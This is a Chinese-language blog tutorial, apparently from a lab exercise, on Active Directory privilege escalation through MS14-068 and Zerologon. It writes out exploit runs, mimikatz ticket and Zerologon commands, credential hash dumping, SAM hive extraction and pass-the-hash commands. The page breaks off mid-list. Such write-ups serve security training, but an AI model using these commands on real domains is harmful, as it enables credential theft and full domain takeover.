@@ -1,0 +1,837 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="August Rosenberg">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="简介 域环境提权，就是从普通域用户权限到域控管理权限   域渗透的主要目标就是拿下域控管理权限，拿下域控制器，进而拿下整个域  域内的权限提升更像是横向移动，只要获取到了域控的权限就拿到了所有的主机 MS14-068漏洞简介 该漏洞可能允许攻击者将未经授权的域用户账户的权限,提权到域管理员的权限。    漏洞原理 服务票据是客户端直接发送给服务器，并请求服务资源的。如果服务器没有向域控DC验证PA">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域环境权限提升">
+<meta property="og:url" content="https://tsy244.github.io/2024/02/14/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/index.html">
+<meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="简介 域环境提权，就是从普通域用户权限到域控管理权限   域渗透的主要目标就是拿下域控管理权限，拿下域控制器，进而拿下整个域  域内的权限提升更像是横向移动，只要获取到了域控的权限就拿到了所有的主机 MS14-068漏洞简介 该漏洞可能允许攻击者将未经授权的域用户账户的权限,提权到域管理员的权限。    漏洞原理 服务票据是客户端直接发送给服务器，并请求服务资源的。如果服务器没有向域控DC验证PA">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214103016798.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214103212163.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214103551078.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214103654660-17078782918081.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214104528009.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214105229558.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214113532321-17078817366274.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214121417792.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214144941712.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214121534872.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214134726247.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214135552938.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214135723990.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214145341876.png">
+<meta property="article:published_time" content="2024-02-14T01:49:35.000Z">
+<meta property="article:modified_time" content="2024-02-14T06:59:00.241Z">
+<meta property="article:author" content="August Rosenberg">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214103016798.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>域环境权限提升 - AU9U5T</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tsy244.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":"G-BL1W5LRRDJ","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>AU9U5T&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="域环境权限提升"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        August Rosenberg
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-14 09:49" pubdate>
+          February 14, 2024 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.8k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          24 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">域环境权限提升</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote>
+<p>域环境提权，就是从普通域用户权限到域控管理权限  </p>
+<p>域渗透的主要目标就是拿下域控管理权限，拿下域控制器，进而拿下整个域</p>
+</blockquote>
+<p>域内的权限提升更像是横向移动，只要获取到了域控的权限就拿到了所有的主机</p>
+<h1 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><blockquote>
+<p>该漏洞可能允许攻击者将未经授权的域用户账户的权限,提权到域管理员的权限。  </p>
+</blockquote>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><blockquote>
+<p>服务票据是客户端直接发送给服务器，并请求服务资源的。如果服务器没有向域控DC验证PAC的话，  那么客户端可以伪造域管的权限来访问服务器。</p>
+</blockquote>
+<p>这个就是黄金票据</p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
+<li>域控没有安装MS14-068的补丁KB3011780  </li>
+<li>拥有一台域内主机权限  </li>
+<li>具有普通域用户密码、Hash值以及用户SUID</li>
+</ol>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol>
+<li><p>漏洞检测</p>
+<p>查看是否存在KB3011780 补丁来判断是否存在漏洞，一般在域中的漏洞补丁都是批量安装的</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">wmic qfe</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214103016798.png" srcset="/img/loading.gif" lazyload alt="image-20240214103016798"></p>
+<p>发现并不存在该补丁</p>
+</li>
+<li><p>收集sid值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /all<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214103212163.png" srcset="/img/loading.gif" lazyload alt="image-20240214103212163"></p>
+<p>如果本身是system 的话出现的sid 会有点奇怪</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">105521541</span>-<span class="hljs-number">3531550336</span>-<span class="hljs-number">1849330903</span>-<span class="hljs-number">500</span><br>   <br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获取域用户的hash </p>
+<p>在这一步需要提权才行</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">getsystem</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214103551078.png" srcset="/img/loading.gif" lazyload alt="image-20240214103551078"></p>
+<p>由于机器比较古老，基本都是一提一个准</p>
+<p>然后获取hash</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hashdump</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214103654660-17078782918081.png" srcset="/img/loading.gif" lazyload alt="image-20240214103654660"></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">august:</span><span class="hljs-number">1000</span>:aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:<span class="hljs-number">31</span>d<span class="hljs-number">6</span>cfe<span class="hljs-number">0</span>d<span class="hljs-number">16</span>ae<span class="hljs-number">931</span>b<span class="hljs-number">73</span><span class="hljs-keyword">c</span><span class="hljs-number">59</span>d<span class="hljs-number">7e0</span><span class="hljs-keyword">c</span><span class="hljs-number">089</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>:::<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获取明文密码</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">logonpasswords</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>重新制作当前的票据</p>
+<p>删除原来的票据</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz kerberos::purge<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214104528009.png" srcset="/img/loading.gif" lazyload alt="image-20240214104528009"></p>
+<p>生成认证证书之前我们需要先下载工具</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/abatchy17/</span>WindowsExploits<span class="hljs-regexp">/tree/m</span>aster/MS14-<span class="hljs-number">068</span><br></code></pre></td></tr></table></figure>
+
+<p>然后将本机的工具上传到受害者的机器</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">upload <span class="hljs-name">D</span>:\tools\penetration\提权\windows\MS14<span class="hljs-number">-068.</span>exe .<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214105229558.png" srcset="/img/loading.gif" lazyload alt="image-20240214105229558"></p>
+<p>然后发现成功的上传，然后开始制作票据</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">shell</span> MS14-<span class="hljs-number">068</span>.exe -u august@august.com -s S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1007551803</span>-<span class="hljs-number">2786613087</span>-<span class="hljs-number">1256062893</span>-<span class="hljs-number">1001</span> -d <span class="hljs-number">10.10.10.120</span><br></code></pre></td></tr></table></figure>
+
+<p>ip 可以通过ping dc 直接获取</p>
+</li>
+<li><p>写入证书</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">mimikatz kerberos::ptc <span class="hljs-title class_">TGT_de1ay</span><span class="hljs-variable">@de1ay</span>.com.ccache<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>验证</p>
+<p>直接访问域控的c 盘文件</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">dir</span> \\dc\c$</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>可以使用当前的用户进行创建服务或者其他操作</p>
+</li>
+</ol>
+<h1 id="CVE-2020-1472-–-Netlogon域提权"><a href="#CVE-2020-1472-–-Netlogon域提权" class="headerlink" title="CVE-2020-1472  – Netlogon域提权"></a>CVE-2020-1472  – Netlogon域提权</h1><h2 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><blockquote>
+<p>2020年08月12日， 微软官方发布了 NetLogon 特权提升漏洞的风险通告。攻击者通过NetLogon（MS-NRPC），建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成  功利用此漏洞的攻击者可以在该网络中的设备上运行经特殊设计的应用程序。  </p>
+</blockquote>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="手动利用"><a href="#手动利用" class="headerlink" title="手动利用"></a>手动利用</h3><ol>
+<li><p>获取域控主机的名称</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;domain</span> controllers<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214113532321-17078817366274.png" srcset="/img/loading.gif" lazyload alt="image-20240214113532321"></p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">view</span> <br><span class="hljs-keyword">shell</span> nslookup DC<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>检测是否存在漏洞</p>
+<p>使用代理才能连接到dc</p>
+<p>在cs 里面添加代理的方式</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">socks port</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214121417792.png" srcset="/img/loading.gif" lazyload alt="image-20240214121417792"></p>
+<p>可以查看已知的代理</p>
+</li>
+<li><p>上传漏洞检测程序</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214144941712.png" srcset="/img/loading.gif" lazyload alt="image-20240214144941712"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">zerologon_tester</span>.exe DC <span class="hljs-number">10.10.10.10</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214121534872.png" srcset="/img/loading.gif" lazyload alt="image-20240214121534872"></p>
+</li>
+<li><p>利用漏洞重置账号</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains</span> python3 CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">1472</span>.py DC DC$ <span class="hljs-number">10.10.10.10</span><br></code></pre></td></tr></table></figure>
+
+<p>将会把DC$ 用户的账号密码置空</p>
+</li>
+<li><p>获取域控用户的hash</p>
+<blockquote>
+<p>  <a target="_blank" rel="noopener" href="https://github.com/fortra/impacket.git">https://github.com/fortra/impacket.git</a>  </p>
+</blockquote>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> secretsdump.<span class="hljs-keyword">py</span> <span class="hljs-string">&#x27;de1ay.com/DC$@10.10.10.10&#x27;</span> -<span class="hljs-keyword">no</span>-pass<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>使用hash 横向移动</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">7</span>e9067ca378134e50512ab894de75517 mingy/administrator@<span class="hljs-number">10.10.10.10</span><br>   <br></code></pre></td></tr></table></figure>
+</li>
+<li><p>恢复域 - 获取Hash</p>
+<p>做这一步的意义是，由于这个是直接将原来的DC$ 用户密码置空，现在准备回复</p>
+<p>获取Sam数据库</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-meta"># 保存</span><br>reg <span class="hljs-keyword">save</span> HKLM\<span class="hljs-keyword">SYSTEM</span> <span class="hljs-keyword">SYSTEM</span><br>reg <span class="hljs-keyword">save</span> HKLM\SAM SAM<br>reg <span class="hljs-keyword">save</span> HKLM\SECURITY SECURITY<br>   <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-meta"># 下载</span><br>lget <span class="hljs-keyword">SYSTEM</span><br>lget SAM<br>lget SECURITY<br>   <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 删除</span><br>del /f SYSTEM<br>del /f SAM<br>del /f SECURITY<br>   <br></code></pre></td></tr></table></figure>
+
+<p>解密smb 数据库</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">python3 secretsdump.py -sam SAM -<span class="hljs-keyword">system</span> <span class="hljs-keyword">SYSTEM</span> -<span class="hljs-keyword">security</span> <span class="hljs-keyword">SECURITY</span> <span class="hljs-keyword">LOCAL</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214134726247.png" srcset="/img/loading.gif" lazyload alt="image-20240214134726247"></p>
+</li>
+<li><p>恢复域 - 还原Hash</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains</span> python3 reinstall_original_pw.py DC <span class="hljs-number">10.10.10.10</span> <span class="hljs-number">2</span>f7ff113dc8e29e9e2394cdbd05bf2ae<br>   <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">shell</span> reinstall_original_pw.exe DC <span class="hljs-number">10.10.10.10</span> <span class="hljs-number">2</span>f7ff113dc8e29e9e2394cdbd05bf2ae<br></code></pre></td></tr></table></figure>
+
+<p>但是很有可能出现问题</p>
+</li>
+</ol>
+<h3 id="mimikatz-利用"><a href="#mimikatz-利用" class="headerlink" title="mimikatz 利用"></a>mimikatz 利用</h3><ol>
+<li><p>检测是否存在漏洞</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz lsadump::zerologon <span class="hljs-regexp">/target:10.10.10.10 /</span>account:DC$<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214135552938.png" srcset="/img/loading.gif" lazyload alt="image-20240214135552938"></p>
+</li>
+<li><p>利用漏洞重置域账号</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz lsadump::zerologon /target:10.10.10.10 /account:DC$ /exploit<br></code></pre></td></tr></table></figure>
+
